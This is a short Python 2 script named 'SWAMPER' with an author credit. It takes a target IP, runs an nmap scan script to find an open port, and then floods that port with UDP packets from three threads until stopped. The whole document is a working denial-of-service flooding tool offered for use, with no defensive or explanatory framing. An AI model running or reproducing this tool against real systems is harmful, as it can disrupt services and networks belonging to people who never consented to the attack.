#!/usr/bin/python
import socket 
import threading
import sys
import time
import os
import ipaddress
print """\033[1;32;40m ==-==-=-=-={SWAMPER}===-=-=--=-=-=-==-=Author:EmranHattab \033[0;32;40m"""

def validIP(IP):
      if IP.count(".")!=3:
          return False
      else:
          L=IP.split(".")
          L=map(int,L)
          for i in range(len(L)):
              if not( L[i]>=0  and  L[i]<=255):
                    return False
      return True

g=0
#function start as thread
def sender(c,a):
    x=0
    try:
        while g!=1:
          c.sendto("(*&^%$##$%^&*&^%$#",a)
        else:
            print "threading stopped..\n"
            time.sleep(1)
            sys.exit(1)
    except Exception as e:
           pass



#create socket as an client
c1=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
address=raw_input("Enter the target IP : ")


val=validIP(str(address).strip())
if val!=True:
    print val
    print "try again!"
    sys.exit(1)


#execute bash script for nmap port scanning
os.system('./bash_nmap.sh')
#open nmap output file
ports=open('out.nmap','r')
#split them based on newline 
ports=ports.read().strip().split("\n")
ports2=list()




#trim slashes and take the pure port number !
for i in range(len(ports)):
    slash=ports[i].find("/")
    ports2.append(ports[i][:slash])


ports2=map(int,ports2)

target=(str(address).strip(),ports2[0])
t1=threading.Thread(target=sender,args=(c1,target))
t2=threading.Thread(target=sender,args=(c1,target))
t3=threading.Thread(target=sender,args=(c1,target))
t1.start()
t2.start()
t3.start()


while  g !=1:
      time.sleep(1)
      q=raw_input("Enter q to stop! : ")
      if str(q).strip()=="q":
          g=1
else:
    time.sleep(2)
    print "Exiting!"
    os.system("rm -f out.nmap")
    time.sleep(2)
    sys.exit(0)



